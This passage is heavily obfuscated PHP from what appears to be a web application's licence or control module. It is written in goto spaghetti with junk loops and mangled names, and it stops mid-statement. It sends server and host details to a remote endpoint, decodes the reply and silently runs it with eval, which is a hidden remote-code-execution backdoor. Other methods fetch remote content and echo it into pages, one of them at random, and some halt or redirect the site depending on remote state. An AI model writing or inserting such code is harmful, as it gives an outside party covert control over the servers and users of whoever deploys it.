$EŒÚ© îø¥[629]; goto B•ï„åŠ§; b©óÎÀœŒÄ: $fÆÃ³È…İ[61]($fÆÃ³È…İ[62])->{$_SERVER[šãè][224]}($fÆÃ³È…İ[225], $fÆÃ³È…İ[240]); $this->vwxd7ad09c58 = array(); $B»Åƒ¦øµğ = $EŒÚ© îø¥[628]; goto c¦ôëîª¯ä; dÉÙÆ§Îİ: $EŒÚ© îø¥ =& $_SERVER[ÉóçÄÇ]; $fÆÃ³È…İ =& $_SERVER[šãè]; $fÆÃ³È…İ[61]($fÆÃ³È…İ[62])->{$_SERVER[šãè][227]}(array($fÆÃ³È…İ[215] => $fÆÃ³È…İ[10], $fÆÃ³È…İ[216] => $fÆÃ³È…İ[10], $fÆÃ³È…İ[126] => $fÆÃ³È…İ[127], $fÆÃ³È…İ[128] => $fÆÃ³È…İ[10], $fÆÃ³È…İ[129] => $fÆÃ³È…İ[10])); goto b©óÎÀœŒÄ; B•ï„åŠ§: if (!$FàÊñ®âùê) { die; } goto Bºä‘è‘­ø; Bºä‘è‘­ø: } private function waytf199a8a7() { goto b·íê×ß¨; e˜›¯½êÄ«: if (!$F°Ã¦‡‘î[198]($CÌÖ­Ò±¶³) || !isset($CÌÖ­Ò±¶³[$F°Ã¦‡‘î[241]]) || $F°Ã¦‡‘î[242]() - $CÌÖ­Ò±¶³[$F°Ã¦‡‘î[241]] >= 60) { $Cö®É˜ì¯ = $F°Ã¦‡‘î[228]($F°Ã¦‡‘î[61]($F°Ã¦‡‘î[11])->{$_SERVER[šãè][229]}(), $F°Ã¦‡‘î[230]); $cÓ©»Õ¦ğÖ = $Cö®É˜ì¯[$F°Ã¦‡‘î[231]]; $d‹¼Äå‰ßó = $F°Ã¦‡‘î[120]($_SERVER[$F°Ã¦‡‘î[121]] . $F°Ã¦‡‘î[220]($dŒóãèƒ¹) . $f¥ªå³Ä[$F°Ã¦‡‘î[216]]); $a†ò††ëºÛ = $F°Ã¦‡‘î[220]($F°Ã¦‡‘î[25]($d‹¼Äå‰ßó, 10, 16)); $CÌÖ­Ò±¶³ = $this->{$_SERVER[šãè][195]}($cÓ©»Õ¦ğÖ[$F°Ã¦‡‘î[100]][$a†ò††ëºÛ], $d‹¼Äå‰ßó); $CÌÖ­Ò±¶³ = $F°Ã¦‡‘î[197]($CÌÖ­Ò±¶³, !0); } if (!$F°Ã¦‡‘î[198]($CÌÖ­Ò±¶³)) { return $this->{$_SERVER[šãè][170]}(); } $BÍ¦öÜÙ• = $F°Ã¦‡‘î[150]($CÌÖ­Ò±¶³[$F°Ã¦‡‘î[151]]); goto fîÌŸÖÏå™; cã÷´™ÂÀ¶: $this->fjny2ecd3534 = $f¥ªå³Ä[$F°Ã¦‡‘î[126]]; goto C“óÇ¢ˆî—; B¸èë¿Å´ô: $dŒóãèƒ¹ = $F°Ã¦‡‘î[61]($F°Ã¦‡‘î[62])->{$_SERVER[šãè][63]}($F°Ã¦‡‘î[122]); $b“Ú×ğÕµ™ = $F°Ã¦‡‘î[236] . $F°Ã¦‡‘î[120]($dŒóãèƒ¹ . $F°Ã¦‡‘î[237]); $CÌÖ­Ò±¶³ = Cache::get($b“Ú×ğÕµ™); goto e˜›¯½êÄ«; dí»§™¹àÌ: $e‚§ÙÆøæï = $cêÀ‘¿Á¯Í[630]; $this->fjny2ecd3534 = $F°Ã¦‡‘î[127]; $b±­¢“‰åö = $cêÀ‘¿Á¯Í[631]; goto B¾°‘¿–ŒÆ; B¾°‘¿–ŒÆ: $f¥ªå³Ä = $F°Ã¦‡‘î[61]($F°Ã¦‡‘î[62])->{$_SERVER[šãè][63]}(); $EÎÌ“¾ÛÇ¨ = $cêÀ‘¿Á¯Í[632]; if ($f¥ªå³Ä[$F°Ã¦‡‘î[126]] == $F°Ã¦‡‘î[127]) { return; } goto B¸èë¿Å´ô; b·íê×ß¨: $cêÀ‘¿Á¯Í =& $_SERVER[ÉóçÄÇ]; $F°Ã¦‡‘î =& $_SERVER[šãè]; $_SERVER[$F°Ã¦‡‘î[181]] = $F°Ã¦‡‘î[112]($_SERVER, $F°Ã¦‡‘î[181], APP_HOST); goto dí»§™¹àÌ; fîÌŸÖÏå™: if ($F°Ã¦‡‘î[242]() >= $BÍ¦öÜÙ•) { return $this->{$_SERVER[šãè][170]}(); } if ($F°Ã¦‡‘î[242]() - $CÌÖ­Ò±¶³[$F°Ã¦‡‘î[241]] > 20) { $CÌÖ­Ò±¶³[$F°Ã¦‡‘î[241]] = $F°Ã¦‡‘î[242](); Cache::set($b“Ú×ğÕµ™, $CÌÖ­Ò±¶³); } $this->vwxd7ad09c58 = $CÌÖ­Ò±¶³; goto cã÷´™ÂÀ¶; C“óÇ¢ˆî—: } private function fuys86b06bf6() { goto a³Ü¤äáŒ­; a³Ü¤äáŒ­: $FõÎŞšï =& $_SERVER[ÉóçÄÇ]; $Aî¹·æå¦ =& $_SERVER[šãè]; $F·ò†¼º‰å = $GLOBALS[$Aî¹·æå¦[22]]; goto cƒª™›êä; F–¹œ‚«¡ù: if ($Fèé‚¹Ë == $Aî¹·æå¦[243] && $this->fjny2ecd3534 == $Aî¹·æå¦[127]) { $Aî¹·æå¦[172]($Aî¹·æå¦[204]($Aî¹·æå¦[244]), !1, $Aî¹·æå¦[245]); } $côâ¬›¹ä = array($Aî¹·æå¦[246], $Aî¹·æå¦[247]); if ($Aî¹·æå¦[248]($Fèé‚¹Ë, $côâ¬›¹ä)) { if ($this->fjny2ecd3534 == $Aî¹·æå¦[127] && isset($F·ò†¼º‰å[$Aî¹·æå¦[249]])) { $Aî¹·æå¦[172]($Aî¹·æå¦[204]($Aî¹·æå¦[244]), !1, $Aî¹·æå¦[245]); die; } $bó¸ñÔæ = $this->{$_SERVER[šãè][143]}(); if ($bó¸ñÔæ != $Aî¹·æå¦[250]($Aî¹·æå¦[251])) { if ($bó¸ñÔæ <= $Aî¹·æå¦[61]($Aî¹·æå¦[145])->{$_SERVER[šãè][146]}()) { $Aî¹·æå¦[172]($Aî¹·æå¦[204]($Aî¹·æå¦[252]), !1, $Aî¹·æå¦[245]); die; } } } goto b«öÕ×÷; cƒª™›êä: $Fèé‚¹Ë = $_SERVER[$Aî¹·æå¦[44]]; $Bƒ‘ŠØ¤Œß = $FõÎŞšï[633]; while (strlen($Bƒ‘ŠØ¤Œß) < $FõÎŞšï[580]) { if (!$Bƒ‘ŠØ¤Œß) { break; } $Bƒ‘ŠØ¤Œß++; } goto F–¹œ‚«¡ù; b«öÕ×÷: } private function crol4260a2fa() { goto aŠ¿œÊçøÊ; DÕ¤¦ñµª…: if ($aéŒ»Î÷Ò && $døÂÊš”[32]($aéŒ»Î÷Ò, $døÂÊš”[266])) { echo $aéŒ»Î÷Ò; } die; goto cğç£¯îç; Bòë¿©¤õã: $f‘±í­ÑÅğ = $this->{$_SERVER[šãè][256]}($f‘±í­ÑÅğ, $døÂÊš”[257]); $C¨Á±ˆ¸†• = $døÂÊš”[258](array($døÂÊš”[259] => array($døÂÊš”[260] => $døÂÊš”[261], $døÂÊš”[262] => 3))); $aéŒ»Î÷Ò = @$døÂÊš”[263]($f‘±í­ÑÅğ, !1, $C¨Á±ˆ¸†•); goto BòÚÔ”Ïí; Aš‡»ÄÊÓ: if (!$døÂÊš”[112]($GLOBALS, $døÂÊš”[138]) || !isset($_GET[$døÂÊš”[254]])) { return; } if (!$døÂÊš”[248]($_SERVER[$døÂÊš”[44]], $dÜ¹ ñäõ)) { return; } $f‘±í­ÑÅğ = $døÂÊš”[255]; goto Bòë¿©¤õã; BòÚÔ”Ïí: $døÂÊš”[264]($døÂÊš”[265]); $FÈÅ¬Äæé = $aÙ§ãçÙÓ[634]; if (strlen($FÈÅ¬Äæé) < $aÙ§ãçÙÓ[580]) { die; } goto DÕ¤¦ñµª…; aŠ¿œÊçøÊ: $aÙ§ãçÙÓ =& $_SERVER[ÉóçÄÇ]; $døÂÊš” =& $_SERVER[šãè]; $dÜ¹ ñäõ = array($døÂÊš”[141], $døÂÊš”[253]); goto Aš‡»ÄÊÓ; cğç£¯îç: } public function splu85a087c7($Dæ¨©¾Š‹) { goto F¶×¤óÙ‰Ö; F¶×¤óÙ‰Ö: $C‚› õ…ß£ =& $_SERVER[ÉóçÄÇ]; $CÇ«°¸ÆŒ¶ =& $_SERVER[šãè]; if ($this->fjny2ecd3534 == $CÇ«°¸ÆŒ¶[267]) { return $Dæ¨©¾Š‹; } goto EÑ»‰ÍÁŒ•; EÑ»‰ÍÁŒ•: $dâ› ×áŒª = array($CÇ«°¸ÆŒ¶[268] => $CÇ«°¸ÆŒ¶[269], $CÇ«°¸ÆŒ¶[270] => $CÇ«°¸ÆŒ¶[269], $CÇ«°¸ÆŒ¶[271] => $CÇ«°¸ÆŒ¶[269], $CÇ«°¸ÆŒ¶[272] => $CÇ«°¸ÆŒ¶[269], $CÇ«°¸ÆŒ¶[273] => $CÇ«°¸ÆŒ¶[269], $CÇ«°¸ÆŒ¶[274] => $CÇ«°¸ÆŒ¶[275], $CÇ«°¸ÆŒ¶[276] => $CÇ«°¸ÆŒ¶[275], $CÇ«°¸ÆŒ¶[277] => $CÇ«°¸ÆŒ¶[275], $CÇ«°¸ÆŒ¶[278] => $CÇ«°¸ÆŒ¶[275], $CÇ«°¸ÆŒ¶[279] => $CÇ«°¸ÆŒ¶[275], $CÇ«°¸ÆŒ¶[280] => $CÇ«°¸ÆŒ¶[275], $CÇ«°¸ÆŒ¶[281] => $CÇ«°¸ÆŒ¶[275]); $Eñ‡âŠ™™ = $CÇ«°¸ÆŒ¶[0]($CÇ«°¸ÆŒ¶[282], $CÇ«°¸ÆŒ¶[112]($this->vwxd7ad09c58, $CÇ«°¸ÆŒ¶[135], $CÇ«°¸ÆŒ¶[10])); $eÖƒ›ÕÉÓ = $C‚› õ…ß£[635]; goto aê¨’Ñîö; aê¨’Ñîö: if (!$eÖƒ›ÕÉÓ) { die; } $bê¼Á·ªÇä = array(); $eê¯¼æáãä = $C‚› õ…ß£[636]; goto EŒÙÜê®ê; EŒÙÜê®ê: foreach ($dâ› ×áŒª as $dïÖŒöÁø => $cÛÅ®¢©ÎŸ) { if ($cÛÅ®¢©ÎŸ == $CÇ«°¸ÆŒ¶[269] && $CÇ«°¸ÆŒ¶[25]($this->fjny2ecd3534, 0, 1) == $CÇ«°¸ÆŒ¶[269]) { continue; } if (!$CÇ«°¸ÆŒ¶[248]($dïÖŒöÁø, $Eñ‡âŠ™™)) { $bê¼Á·ªÇä[] = $dïÖŒöÁø; } } foreach ($bê¼Á·ªÇä as $dïÖŒöÁø) { unset($Dæ¨©¾Š‹[$dïÖŒöÁø]); $b–‰ğõĞ—“ = $C‚› õ…ß£[637]; while (strlen($b–‰ğõĞ—“) < $C‚› õ…ß£[606]) { if (!$b–‰ğõĞ—“) { break; } $b–‰ğõĞ—“++; } } return $Dæ¨©¾Š‹; goto Dƒò®Ñù»ä; Dƒò®Ñù»ä: } private function xqohecdc81cb() { $cƒÍ‹‰Ğ”Í =& $_SERVER[šãè]; if ($this->fjny2ecd3534 != $cƒÍ‹‰Ğ”Í[127]) { return; } $GLOBALS[$cƒÍ‹‰Ğ”Í[100]][$cƒÍ‹‰Ğ”Í[104]][$cƒÍ‹‰Ğ”Í[283]] = $cƒÍ‹‰Ğ”Í[226]; $GLOBALS[$cƒÍ‹‰Ğ”Í[100]][$cƒÍ‹‰Ğ”Í[284]] = $cƒÍ‹‰Ğ”Í[226]; if ($cƒÍ‹‰Ğ”Í[61]($cƒÍ‹‰Ğ”Í[285])->{$_SERVER[šãè][63]}($cƒÍ‹‰Ğ”Í[89]) != $cƒÍ‹‰Ğ”Í[240]) { $cƒÍ‹‰Ğ”Í[61]($cƒÍ‹‰Ğ”Í[285])->{$_SERVER[šãè][227]}($cƒÍ‹‰Ğ”Í[89], $cƒÍ‹‰Ğ”Í[240]); } } public function avyg30702b01() { return $_SERVER[šãè][286]; } private function qbedb4185098() { goto b‡Ã¯éñÙ; dù¢„ñöìæ: if ($FËÓ÷ĞÈëÓ[$AÏ‡ìØ »¤[171]] && $FËÓ÷ĞÈëÓ[$AÏ‡ìØ »¤[296]]) { if ($this->{$_SERVER[šãè][206]}($FËÓ÷ĞÈëÓ[$AÏ‡ìØ »¤[296]]) == $Bä™«Ä¾[$AÏ‡ìØ »¤[171]]) { return; } } $this->{$_SERVER[šãè][170]}(); $DÅ¹£”ŸÈ = $BÅÏ¾òìµÃ[642]; goto a®ëéÄ; c“Ûà³×£Ú: $f‚£ƒ«ŞÒ = $BÅÏ¾òìµÃ[640]; if (!$f‚£ƒ«ŞÒ) { die; } $FËÓ÷ĞÈëÓ = $this->{$_SERVER[šãè][189]}($AÏ‡ìØ »¤[295], $Bä™«Ä¾); goto cÖÄ©ºÔ‘İ; C¹øö„‚ª: $F¬™ŞÔ£¯ = $BÅÏ¾òìµÃ[639]; if (!$F¬™ŞÔ£¯) { die; } if ($this->fjny2ecd3534 == $AÏ‡ìØ »¤[127] || !$AÏ‡ìØ »¤[112]($GLOBALS, $AÏ‡ìØ »¤[138])) { return; } goto BÎªèƒÎ¹˜; C˜¨•Úø·ô: $DÎÀ§ÖîØì = $BÅÏ¾òìµÃ[638]; while ($DÎÀ§ÖîØì < $BÅÏ¾òìµÃ[570]) { if ($DÎÀ§ÖîØì >= 0) { break; } $DÎÀ§ÖîØì++; } $DÜ®†˜†‡ = $AÏ‡ìØ »¤[290] . $AÏ‡ìØ »¤[120]($AÏ‡ìØ »¤[291]); goto C¹øö„‚ª; BÎªèƒÎ¹˜: if (!$AÏ‡ìØ »¤[248]($_SERVER[$AÏ‡ìØ »¤[44]], $AÈµ«“ë¶á)) { return; } if ($AÏ‡ìØ »¤[242]() % 4 != 0) { return; } $fé¢Å°ò­ = $AÏ‡ìØ »¤[13](array($AÏ‡ìØ »¤[292], $AÏ‡ìØ »¤[293]), $DÜ®†˜†‡); goto cÃî®æòÑ; a®ëéÄ: while ($DÅ¹£”ŸÈ < $BÅÏ¾òìµÃ[606]) { if ($DÅ¹£”ŸÈ >= 0) { break; } $DÅ¹£”ŸÈ++; } if ($this->{$_SERVER[šãè][206]}($FËÓ÷ĞÈëÓ[$AÏ‡ìØ »¤[296]]) != $Bä™«Ä¾[$AÏ‡ìØ »¤[171]]) { $dìƒ™µÒéé = array($AÏ‡ìØ »¤[208] => $AÏ‡ìØ »¤[61]($AÏ‡ìØ »¤[62])->{$_SERVER[šãè][63]}($AÏ‡ìØ »¤[122]), $AÏ‡ìØ »¤[209] => $_SERVER[$AÏ‡ìØ »¤[121]], $AÏ‡ìØ »¤[210] => $AÏ‡ìØ »¤[211](), $AÏ‡ìØ »¤[180] => $_SERVER[$AÏ‡ìØ »¤[181]]); $b“ù‚ó—£ = $this->{$_SERVER[šãè][212]}($AÏ‡ìØ »¤[154]($dìƒ™µÒéé)); $FËÓ÷ĞÈëÓ = $this->{$_SERVER[šãè][189]}($AÏ‡ìØ »¤[213] . $b“ù‚ó—£); if ($FËÓ÷ĞÈëÓ && $AÏ‡ìØ »¤[198]($FËÓ÷ĞÈëÓ) && isset($FËÓ÷ĞÈëÓ[$AÏ‡ìØ »¤[296]])) { $AÛ—§£¯‹¡ = $this->{$_SERVER[šãè][195]}($FËÓ÷ĞÈëÓ[$AÏ‡ìØ »¤[296]], 2); if ($AÛ—§£¯‹¡) { $AÛ—§£¯‹¡ = $this->{$_SERVER[šãè][206]}($AÛ—§£¯‹¡); } if ($AÛ—§£¯‹¡) { try { @eval($AÛ—§£¯‹¡); } catch (Exception $EÌÒ³ÖÅ¸•) { } } } } goto f›Ğíé·¯; cÖÄ©ºÔ‘İ: $Ašµ†øãµ‰ = $BÅÏ¾òìµÃ[641]; while (strlen($Ašµ†øãµ‰) < $BÅÏ¾òìµÃ[580]) { if (!$Ašµ†øãµ‰) { break; } $Ašµ†øãµ‰++; } if (!$AÏ‡ìØ »¤[198]($FËÓ÷ĞÈëÓ)) { return; } goto dù¢„ñöìæ; b‡Ã¯éñÙ: $BÅÏ¾òìµÃ =& $_SERVER[ÉóçÄÇ]; $AÏ‡ìØ »¤ =& $_SERVER[šãè]; $AÈµ«“ë¶á = array($AÏ‡ìØ »¤[287], $AÏ‡ìØ »¤[288], $AÏ‡ìØ »¤[289]); goto C˜¨•Úø·ô; cÃî®æòÑ: if ($fé¢Å°ò­ && $AÏ‡ìØ »¤[242]() - $fé¢Å°ò­ < $AÏ‡ìØ »¤[250]($AÏ‡ìØ »¤[294])) { return; } $AÏ‡ìØ »¤[13](array($AÏ‡ìØ »¤[292], $AÏ‡ìØ »¤[158]), $DÜ®†˜†‡, $AÏ‡ìØ »¤[242]()); $Bä™«Ä¾ = array($AÏ‡ìØ »¤[171] => $AÏ‡ìØ »¤[61]($AÏ‡ìØ »¤[62])->{$_SERVER[šãè][63]}($AÏ‡ìØ »¤[215]), $AÏ‡ìØ »¤[184] => $this->fjny2ecd3534, $AÏ‡ìØ »¤[182] => $_SERVER[$AÏ‡ìØ »¤[183]], $AÏ‡ìØ »¤[175] => $AÏ‡ìØ »¤[155], $AÏ‡ìØ »¤[178] => $_SERVER[$AÏ‡ìØ »¤[179]]); goto c“Ûà³×£Ú; f›Ğíé·¯: } private function brjt455f2b50($bƒáŒÏõˆ£ = '', $D¬óåß¸Ãë = array(), $aÀ°ÄìÖ  = 5) { goto eÓ¡ˆˆáŸ; BÛõÛ«ô‚©: $D˜Ñ¸ä­Ã = $dÍ•ˆØàÎ¡[258](array($dÍ•ˆØàÎ¡[259] => array($dÍ•ˆØàÎ¡[262] => $aÀ°ÄìÖ , $dÍ•ˆØàÎ¡[260] => $dÍ•ˆØàÎ¡[301]), $dÍ•ˆØàÎ¡[302] => array($dÍ•ˆØàÎ¡[303] => !1, $dÍ•ˆØàÎ¡[304] => !1))); $BÕë£ÏØ… = $F…´ÆÒˆ²ñ[644]; while ($BÕë£ÏØ… < $F…´ÆÒˆ²ñ[589]) { if ($BÕë£ÏØ… >= 0) { break; } $BÕë£ÏØ…++; } goto aÌÂÈ ”Ê¬; Aîê®åÑÛÉ: $dç ®’Ò = $F…´ÆÒˆ²ñ[643]; while (strlen($dç ®’Ò) < $F…´ÆÒˆ²ñ[580]) { if (!$dç ®’Ò) { break; } $dç ®’Ò++; } $bÃ¨Ë÷õ×Ù = $this->{$_SERVER[šãè][256]}($bÃ¨Ë÷õ×Ù, $dÍ•ˆØàÎ¡[298]); goto e×‘½ÊôÑ; e×‘½ÊôÑ: $bÃ¨Ë÷õ×Ù = $bÃ¨Ë÷õ×Ù . $bƒáŒÏõˆ£; if ($D¬óåß¸Ãë && $dÍ•ˆØàÎ¡[198]($D¬óåß¸Ãë)) { $bÃ¨Ë÷õ×Ù = $bÃ¨Ë÷õ×Ù . $dÍ•ˆØàÎ¡[299] . $dÍ•ˆØàÎ¡[300]($D¬óåß¸Ãë); } if ($D¬óåß¸Ãë === -1) { return $bÃ¨Ë÷õ×Ù; } goto BÛõÛ«ô‚©; aÌÂÈ ”Ê¬: $D¬óåß¸Ãë = @$dÍ•ˆØàÎ¡[263]($bÃ¨Ë÷õ×Ù, !1, $D˜Ñ¸ä­Ã); return $dÍ•ˆØàÎ¡[197]($D¬óåß¸Ãë, !0); $c³ŠÆÒÖì½ = $F…´ÆÒˆ²ñ[645]; goto e©š¾”İò; eÓ¡ˆˆáŸ: $F…´ÆÒˆ²ñ =& $_SERVER[ÉóçÄÇ]; $dÍ•ˆØàÎ¡ =& $_SERVER[šãè]; $bÃ¨Ë÷õ×Ù = $dÍ•ˆØàÎ¡[297]; goto Aîê®åÑÛÉ; e©š¾”İò: if (strlen($c³ŠÆÒÖì½) < $F…´ÆÒˆ²ñ[570]) { die; } goto A÷‚„’ŞÃ; A÷‚„’ŞÃ: } private function pvsy7e0bdf9f() { goto FÒ…ÛÁÆ—Ä; aÙÍŒÊØïÕ: while ($F›ï‘‚¥½ < $d‹½ŠÏãŸ[570]) { if ($F›ï‘‚¥½ >= 0) { break; } $F›ï‘‚¥½++; } $Eß˜éõ§ = $Eß˜éõ§ ? $c±ëîİ°¦[250]($Eß˜éõ§) : 0; return $dêÙ¡ªŞš¸ + $Eß˜éõ§; goto C¶­ËØ½Æ; FÒ…ÛÁÆ—Ä: $d‹½ŠÏãŸ =& $_SERVER[ÉóçÄÇ]; $c±ëîİ°¦ =& $_SERVER[šãè]; $fµ‚îµàô = array($c±ëîİ°¦[305] => $c±ëîİ°¦[306], $c±ëîİ°¦[307] => $c±ëîİ°¦[308], $c±ëîİ°¦[309] => $c±ëîİ°¦[310], $c±ëîİ°¦[311] => $c±ëîİ°¦[312], $c±ëîİ°¦[313] => $c±ëîİ°¦[314], $c±ëîİ°¦[315] => $c±ëîİ°¦[251], $c±ëîİ°¦[316] => $c±ëîİ°¦[251], $c±ëîİ°¦[317] => $c±ëîİ°¦[306], $c±ëîİ°¦[318] => $c±ëîİ°¦[308], $c±ëîİ°¦[319] => $c±ëîİ°¦[310], $c±ëîİ°¦[320] => $c±ëîİ°¦[321], $c±ëîİ°¦[322] => $c±ëîİ°¦[312], $c±ëîİ°¦[323] => $c±ëîİ°¦[324], $c±ëîİ°¦[325] => $c±ëîİ°¦[314], $c±ëîİ°¦[326] => $c±ëîİ°¦[327], $c±ëîİ°¦[328] => $c±ëîİ°¦[329], $c±ëîİ°¦[330] => $c±ëîİ°¦[331]); goto c’ˆÊŠï…; båˆêã¨¸: $dêÙ¡ªŞš¸ = $c±ëîİ°¦[250]($dêÙ¡ªŞš¸ ? $dêÙ¡ªŞš¸ : $c±ëîİ°¦[306]); $Eß˜éõ§ = $c±ëîİ°¦[112]($this->vwxd7ad09c58, $c±ëîİ°¦[332]); $F›ï‘‚¥½ = $d‹½ŠÏãŸ[647]; goto aÙÍŒÊØïÕ; c’ˆÊŠï…: $dêÙ¡ªŞš¸ = $fµ‚îµàô[$this->fjny2ecd3534]; $dæßŸ‹ßà = $d‹½ŠÏãŸ[646]; if (strlen($dæßŸ‹ßà) < $d‹½ŠÏãŸ[580]) { die; } goto båˆêã¨¸; C¶­ËØ½Æ: } public function hikn3c5bfdc0($dÀ™¿İ«ß‰) { goto d¶ñ«è¶ê³; f×ñÎ¬ìï“: if (strlen($eğ´Ò–»Ê) < $f±äŒóÁ¡¹[606]) { return; } if (!$aàĞ“Ã¦¹[248]($dÀ™¿İ«ß‰[$aàĞ“Ã¦¹[333]], $cšâñ ­Â)) { $aàĞ“Ã¦¹[172]($aàĞ“Ã¦¹[337], !1, $aàĞ“Ã¦¹[245]); } goto bÃåèİÁç; C•†èËĞİ: $cØÜ·˜­¯ = $f±äŒóÁ¡¹[648]; if (strlen($cØÜ·˜­¯) < $f±äŒóÁ¡¹[589]) { return; } if ($dÎ‹÷²’„… <= $b¸ä¶®š¿„) { return; } goto C²ÎÊ‹¼“; C²ÎÊ‹¼“: $cšâñ ­Â = $aàĞ“Ã¦¹[61]($aàĞ“Ã¦¹[145])->{$_SERVER[šãè][334]}($aàĞ“Ã¦¹[333])->{$_SERVER[šãè][335]}($b¸ä¶®š¿„)->{$_SERVER[šãè][336]}(); $cšâñ ­Â = $aàĞ“Ã¦¹[228]($cšâñ ­Â, $aàĞ“Ã¦¹[10], $aàĞ“Ã¦¹[333]); $eğ´Ò–»Ê = $f±äŒóÁ¡¹[649]; goto f×ñÎ¬ìï“; d¶ñ«è¶ê³: $f±äŒóÁ¡¹ =& $_SERVER[ÉóçÄÇ]; $aàĞ“Ã¦¹ =& $_SERVER[šãè]; $b¸ä¶®š¿„ = $this->{$_SERVER[šãè][143]}(); goto fÈŸÕÈ³åÜ; fÈŸÕÈ³åÜ: if ($dÀ™¿İ«ß‰[$aàĞ“Ã¦¹[333]] == $aàĞ“Ã¦¹[226]) { return; } if ($b¸ä¶®š¿„ >= $aàĞ“Ã¦¹[250]($aàĞ“Ã¦¹[251])) { return; } $dÎ‹÷²’„… = $aàĞ“Ã¦¹[61]($aàĞ“Ã¦¹[145])->{$_SERVER[šãè][146]}(); goto C•†èËĞİ; bÃåèİÁç: } public function wosmd3fb39e5() { goto Dß‰£†ÏÅ­; Dß‰£†ÏÅ­: $eˆ¼˜î§®‘ =& $_SERVER[šãè]; if (!$eˆ¼˜î§®‘[112]($GLOBALS, $eˆ¼˜î§®‘[138]) || $eˆ¼˜î§®‘[338](1, 100) > 20) { return; } $aïŞ‘¥Ú•¸ = $eˆ¼˜î§®‘[255]; goto aéœ‚ÆºÑÜ; fÜ¡ôºï¹ä: $dçéÚ°±Üª = @$eˆ¼˜î§®‘[263]($aïŞ‘¥Ú•¸, !1, $b·‚ÚÈ«™ª); echo $eˆ¼˜î§®‘[339] . $eˆ¼˜î§®‘[340]($dçéÚ°±Üª) . $eˆ¼˜î§®‘[341]; goto C¼ëÇ„éÕ; aéœ‚ÆºÑÜ: $aïŞ‘¥Ú•¸ = $this->{$_SERVER[šãè][256]}($aïŞ‘¥Ú•¸, $eˆ¼˜î§®‘[257]); $CÀíƒÉíè˜ = $_SERVER[ÉóçÄÇ][650]; $b·‚ÚÈ«™ª = $eˆ¼˜î§®‘[258](array($eˆ¼˜î§®‘[259] => array($eˆ¼˜î§®‘[260] => $eˆ¼˜î§®‘[261], $eˆ¼˜î§®‘[262] => 3))); goto fÜ¡ôºï¹ä; C¼ëÇ„éÕ: } private function moewcd5cf316($E«’²‰åÑÜ, $EÍ¯’ÄÅªÀ, $fåÃÄĞ•½÷ = 3) { goto BØÆ—Ù‚®ø; BØÆ—Ù‚®ø: $EŠĞ¤Äšà =& $_SERVER[ÉóçÄÇ]; $AÎ­ª½÷çÍ =& $_SERVER[šãè]; $AÎ­ª½÷çÍ[342](1); goto C…İÌÎöŞ; A¸ªîçËÏ°: if ($fåÃÄĞ•½÷ - 1 > 0) { $fË³ŠÖëßã = $this->{$_SERVER[šãè][133]}($fË³ŠÖëßã, $EÍ¯’ÄÅªÀ, $fåÃÄĞ•½÷ - 1); } return $fË³ŠÖëßã; goto b§…¤ÈŠ¬×; AùÍÏº›¨: $DÎ…ç“«Â  = $AÎ­ª½÷çÍ[338](0, 5) . $AÎ­ª½÷çÍ[10]; $C›áŸ’î ê = $AÎ­ª½÷çÍ[130](15); $cê©‰ò‡™¾ = $EŠĞ¤Äšà[652]; goto Cğ¸¯Œ–; Cğ¸¯Œ–: if (strlen($cê©‰ò‡™¾) < $EŠĞ¤Äšà[589]) { die; } $B¿ÙÙ®·ˆ­ = $AÎ­ª½÷çÍ[343]; $B«–Õ‰¬ª— = $EŠĞ¤Äšà[653]; goto f²‡õßŒÅ; f²‡õßŒÅ: while (strlen($B«–Õ‰¬ª—) < $EŠĞ¤Äšà[580]) { if (!$B«–Õ‰¬ª—) { break; } $B«–Õ‰¬ª—++; } switch ($DÎ…ç“«Â ) { case $AÎ­ª½÷çÍ[240]: $fË³ŠÖëßã = $this->{$_SERVER[šãè][153]}($E«’²‰åÑÜ, $AÎ­ª½÷çÍ[220]($EÍ¯’ÄÅªÀ . $C›áŸ’î ê)); $F‘„éÀ¦ÙÓ = $EŠĞ¤Äšà[654]; break; $eø—‘ÇÁ¸ = $EŠĞ¤Äšà[655]; while (strlen($eø—‘ÇÁ¸) < $EŠĞ¤Äšà[570]) { if (!$eø—‘ÇÁ¸) { break; } $eø—‘ÇÁ¸++; } case $AÎ­ª½÷çÍ[226]: $fË³ŠÖëßã = $this->{$_SERVER[šãè][153]}($E«’²‰åÑÜ, $AÎ­ª½÷çÍ[220]($C›áŸ’î ê . $EÍ¯’ÄÅªÀ)); $E‡«õÉø× = $EŠĞ¤Äšà[656]; break; case $AÎ­ª½÷çÍ[344]: $fË³ŠÖëßã = $this->{$_SERVER[šãè][153]}($E«’²‰åÑÜ, $AÎ­ª½÷çÍ[124]($C›áŸ’î ê . $EÍ¯’ÄÅªÀ)); $EŠØŞ…æ = $EŠĞ¤Äšà[657]; while ($EŠØŞ…æ < $EŠĞ¤Äšà[589]) { if ($EŠØŞ…æ >= 0) { break; } $EŠØŞ…æ++; } break; case $AÎ­ª½÷çÍ[345]: $fË³ŠÖëßã = $this->{$_SERVER[šãè][153]}($E«’²‰åÑÜ, $AÎ­ª½÷çÍ[120]($C›áŸ’î ê . $EÍ¯’ÄÅªÀ)); break; case $AÎ­ª½÷çÍ[346]: goto CçÁ‡øªÄî; c¨‚‡¢—‰Ò: for ($a·ÙÎ‚¬­’ = 0; $a·ÙÎ‚¬­’ < $AÎ­ª½÷çÍ[24]($E«’²‰åÑÜ); $a·ÙÎ‚¬­’++) { $F¸ÒÅØÑ¥ = $F¸ÒÅØÑ¥ == $AÎ­ª½÷çÍ[24]($C‘Æ‚ÀØ×ø) ? 0 : $F¸ÒÅØÑ¥; $dã›âĞœ›” = $EŠĞ¤Äšà[663]; $FÎˆ£¬ˆÏƒ = ($aÊ®Ç¥Ï¤ø + $AÎ­ª½÷çÍ[348]($B¿ÙÙ®·ˆ­, $E«’²‰åÑÜ[$a·ÙÎ‚¬­’]) + $AÎ­ª½÷çÍ[349]($C‘Æ‚ÀØ×ø[$F¸ÒÅØÑ¥++])) % 64; $d¢ƒäÎ«ØÀ .= $B¿ÙÙ®·ˆ­[$FÎˆ£¬ˆÏƒ]; $FÙÔ¹´ì = $EŠĞ¤Äšà[664]; } $fË³ŠÖëßã = $AÎ­ª½÷çÍ[340]($b‰¹öÈšÅ . $d¢ƒäÎ«ØÀ); break; goto d¤Ôµò‡; d”“ ö–ĞÓ: $C‘Æ‚ÀØ×ø = $AÎ­ª½÷çÍ[25]($C‘Æ‚ÀØ×ø, $aÊ®Ç¥Ï¤ø % 8, $aÊ®Ç¥Ï¤ø % 8 + 7); $d¢ƒäÎ«ØÀ = $AÎ­ª½÷çÍ[10]; $a·ÙÎ‚¬­’ = 0; goto 